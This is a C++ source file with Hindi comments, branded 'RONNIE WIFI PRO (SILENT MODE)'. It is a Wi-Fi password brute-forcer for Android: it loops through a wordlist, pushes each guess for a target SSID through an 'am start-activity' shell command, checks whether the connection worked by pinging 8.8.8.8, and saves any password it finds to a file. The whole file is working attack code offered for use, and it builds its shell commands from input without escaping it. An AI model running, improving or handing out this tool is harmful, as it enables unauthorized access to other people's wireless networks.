#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

// इंटरनेट चेक करने का फंक्शन (Silent)
bool isConnected() {
    int res = system("ping -c 1 -W 2 8.8.8.8 > /dev/null 2>&1");
    return (res == 0);
}

int main() {
    system("clear");
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "      RONNIE WIFI PRO (SILENT MODE)        " << endl;
    cout << "===========================================" << RESET << endl;

    string ssid, wordlist;
    int sleepTime;

    cout << CYAN << "Target SSID: " << RESET;
    if (!(cin >> ws)) return 0;
    getline(cin, ssid);

    cout << CYAN << "Wordlist Path: " << RESET;
    getline(cin, wordlist);

    cout << CYAN << "Wait Time (Seconds): " << RESET;
    cin >> sleepTime;

    ifstream file(wordlist.c_str());
    if (!file.is_open()) {
        cout << RED << "[-] Error: Wordlist file nahi mili!" << RESET << endl;
        return 1;
    }

    string pass;
    int line_count = 0;
    bool success = false;

    cout << YELLOW << "\n[*] Attack Started in Background Mode..." << RESET << endl;
    cout << "-------------------------------------------" << endl;

    while (getline(file, pass)) {
        line_count++;
        
        if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) pass.pop_back();
        if (pass.length() < 8) continue;

        // टर्मिनल को साफ़ रखने के लिए सिर्फ प्रोग्रेस दिखाएँ
        cout << "\r" << YELLOW << "[TRYING Line: " << line_count << "] " << RESET << "Checking..." << flush;

        /* 
           Background Method: 
           हम '--user 0' का उपयोग करके इसे सिस्टम लेवल पर भेजने की कोशिश करेंगे 
           ताकि सेटिंग्स बार-बार पॉप-अप न हो।
        */
        string cmd = "am start-activity --user 0 -n com.android.settings/.wifi.WriteWifiConfig --es ssid \"" + ssid + "\" --es password \"" + pass + "\" > /dev/null 2>&1";
        system(cmd.c_str());

        // वेट टाइम के दौरान डॉट प्रिंट करें
        for(int i = 0; i < sleepTime; i++) {
            usleep(1000000); 
        }

        if (isConnected()) {
            cout << GREEN << BOLD << "\n\n===========================================" << endl;
            cout << "[+] SUCCESS! SAHI PASSWORD MIL GAYA" << endl;
            cout << "[+] SSID: " << ssid << endl;
            cout << "[+] PASSWORD: " << pass << endl;
            cout << "===========================================" << RESET << endl;
            
            ofstream save("found_pass.txt", ios::app);
            save << "SSID: " << ssid << " | PASS: " << pass << endl;
            save.close();
            
            success = true;
            break; 
        }
    }

    if (!success) cout << RED << "\n\n[-] Wordlist khatam. Password nahi mila." << RESET << endl;

    file.close();
    return 0;
}
